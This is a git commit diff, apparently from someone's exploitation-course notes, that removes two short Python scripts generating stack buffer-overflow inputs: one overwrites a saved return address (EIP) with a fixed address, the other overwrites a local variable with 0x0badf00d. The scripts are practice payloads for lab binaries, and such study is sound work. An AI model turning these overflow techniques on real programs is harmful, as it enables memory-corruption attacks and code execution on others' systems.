3baa5b5ec25b05b39f41e51964c2d96a7a79f259
Devin Neal <devneal17@gmail.com>
2018-01-05 03:51:44 -0500

    moved a challenge to day4

--- notes/day3/eip_overwrite/input.py
+++
@@ -1,5 +0,0 @@
-#!/usr/bin/python
-import struct
-
-addr = struct.pack("<I", 0x0804843b)
-print "A" * 0x44 + addr * 3
--- notes/day3/local_corruption/input.py
+++
@@ -1,8 +0,0 @@
-#!/usr/bin/python
-import struct
-
-#badfood = struct.pack("<I", 0x0badf00d)
-badfood = "\x0d\xf0\xad\x0b"
-s = 'A' * 120 + badfood
-
-print s
